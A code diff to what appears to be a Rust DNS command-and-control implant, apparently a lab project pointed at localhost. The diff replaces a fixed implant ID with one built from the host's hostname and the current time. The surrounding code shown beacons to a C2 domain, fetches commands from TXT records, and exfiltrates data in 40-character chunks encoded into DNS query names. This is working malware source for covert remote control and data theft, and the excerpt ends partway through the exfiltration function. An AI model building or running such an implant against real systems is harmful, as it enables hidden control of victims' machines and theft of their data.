@@ -5,7 +5,6 @@ use std::time::Duration;
 
 pub const C2_SERVER: &str = "127.0.0.1:5353";
 pub const DOMAIN: &str = "c2.local";
-pub const IMPLANT_ID: &str = "implant1";
 pub const BEACON_INTERVAL: u64 = 5; // seconds
 
 // Simple DNS query builder
@@ -36,6 +35,22 @@ pub fn build_dns_query(domain: &str, qtype: u16) -> Vec<u8> {
 
     query
 }
+
+
+pub fn generate_implant_id() -> String {
+    let hostname = hostname::get()
+        .ok()
+        .and_then(|h| h.into_string().ok())
+        .unwrap_or_else(|| "unknown".to_string());
+    
+    let random = std::time::SystemTime::now()
+        .duration_since(std::time::UNIX_EPOCH)
+        .unwrap()
+        .as_secs() % 10000;
+    
+    format!("{}_{}", hostname, random)
+}
+
 
 // Parse A record response
 pub fn parse_a_response(response: &[u8]) -> Option<[u8; 4]> {
@@ -184,8 +199,8 @@ pub fn send_dns_query(socket: &UdpSocket, domain: &str, qtype: u16) -> Result<Ve
     }
 }
 
-pub fn beacon(socket: &UdpSocket) -> Result<bool, String> {
-    let query_domain = format!("{}.beacon.{}", IMPLANT_ID, DOMAIN);
+pub fn beacon(socket: &UdpSocket, implant_id: &str) -> Result<bool, String> {
+    let query_domain = format!("{}.beacon.{}", implant_id, DOMAIN);
     println!("[*] Beaconing: {}", query_domain);
 
     let response = send_dns_query(socket, &query_domain, 1)?; // A record
@@ -199,8 +214,8 @@ pub fn beacon(socket: &UdpSocket) -> Result<bool, String> {
     }
 }
 
-pub fn fetch_command(socket: &UdpSocket) -> Result<Option<String>, String> {
-    let query_domain = format!("cmd.{}.{}", IMPLANT_ID, DOMAIN);
+pub fn fetch_command(socket: &UdpSocket, implant_id: &str) -> Result<Option<String>, String> {
+    let query_domain = format!("cmd.{}.{}", implant_id, DOMAIN);
     println!("[*] Fetching command: {}", query_domain);
 
     let response = send_dns_query(socket, &query_domain, 16)?; // TXT record
@@ -222,13 +237,13 @@ pub fn fetch_command(socket: &UdpSocket) -> Result<Option<String>, String> {
     }
 }
 
-pub fn exfiltrate_data(socket: &UdpSocket, data: &str) -> Result<(), String> {
+pub fn exfiltrate_data(socket: &UdpSocket, data: &str, implant_id: &str) -> Result<(), String> {
     println!("[*] Exfiltrating {} bytes", data.len());
 
     let chunks = chunk_data(data, 40); // 40 chars per chunk
 
     for (seq, chunk) in chunks.iter().enumerate() {
-        let query_domain = format!("{}.{}.{}.exfil.{}", chunk, seq, IMPLANT_ID, DOMAIN);
+        let query_domain = format!("{}.{}.{}.exfil.{}", chunk, seq, implant_id, DOMAIN);
         println!(
             "[*] Sending chunk {}/{}: {}",
             seq + 1,
